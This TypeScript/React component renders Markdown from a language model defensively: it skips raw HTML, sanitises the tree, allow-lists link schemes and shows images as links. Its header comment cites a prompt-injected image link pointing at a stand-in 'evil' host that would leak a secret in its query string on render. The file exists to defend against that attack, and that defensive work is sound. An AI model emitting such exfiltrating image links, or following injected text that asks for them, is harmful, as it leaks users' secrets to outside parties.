/**
 * Markdown from a model is untrusted (CR-006 G3). Defences, in depth:
 * 1. raw HTML is skipped, never parsed (`skipHtml`);
 * 2. the HTML tree is sanitised (rehype-sanitize, GitHub's schema);
 * 3. links: only http(s) and mailto, opened in a new tab without referrer or opener;
 * 4. images are never loaded: a prompt-injected `![](https://evil/?q=<secret>)`
 *    would leak data the moment it renders, so an image is shown as a link;
 * 5. the page's Content-Security-Policy (nginx) blocks anything that slips through.
 */
import ReactMarkdown, { type Components } from "react-markdown";
import rehypeSanitize from "rehype-sanitize";
import remarkGfm from "remark-gfm";

const SAFE_URL = /^(https?:|mailto:)/i;

export function safeUrl(url: unknown): string | null {
  return typeof url === "string" && SAFE_URL.test(url.trim()) ? url.trim() : null;
}

const link = "font-medium text-sun-700 underline decoration-sun-300 underline-offset-2 hover:decoration-sun-500 dark:text-sun-300";

const components: Components = {
  a: ({ href, children }) => {
    const url = safeUrl(href);
    return url ? (
      <a href={url} target="_blank" rel="noopener noreferrer nofollow" className={link}>
        {children}
      </a>
    ) : (
      <span>{children}</span>
    );
  },
  img: ({ src, alt }) => {
    const url = safeUrl(src);
    const label = `image: ${alt?.trim() ? alt : "untitled"}`;
    return url ? (
      <a href={url} target="_blank" rel="noopener noreferrer nofollow" className={link}>
        [{label}]
      </a>
    ) : (
      <span>[{label}]</span>
    );
  },
};

const PROSE = [
  "prose prose-stone max-w-none dark:prose-invert",
  "prose-p:leading-relaxed prose-p:my-2 prose-li:my-0.5 prose-headings:font-display prose-headings:font-medium",
  "prose-code:font-mono prose-code:text-[0.85em] prose-code:before:content-none prose-code:after:content-none",
  "prose-code:rounded-md prose-code:bg-stone-100 prose-code:px-1.5 prose-code:py-0.5 prose-code:font-normal dark:prose-code:bg-stone-800",
  "prose-pre:rounded-xl prose-pre:bg-stone-900 prose-pre:text-stone-100 prose-pre:text-[13px] dark:prose-pre:bg-black/40",
  "[&_pre_code]:bg-transparent [&_pre_code]:p-0",
  "prose-table:text-sm prose-th:font-semibold",
].join(" ");

/** A line that is only a number and a full stop ("48.") is an empty list item to
 * Markdown, so the answer would vanish: keep it as text. */
export function keepBareNumbers(text: string): string {
  return text.replace(/^(\s*\d+)([.)])(\s*)$/gm, "$1\\$2$3");
}

export function Markdown({ text, small = false }: { text: string; small?: boolean }) {
  return (
    <div className={`${PROSE} ${small ? "text-[13px]" : "text-[15px]"}`}>
      <ReactMarkdown remarkPlugins={[remarkGfm]} rehypePlugins={[rehypeSanitize]} components={components} skipHtml>
        {keepBareNumbers(text)}
      </ReactMarkdown>
    </div>
  );
}
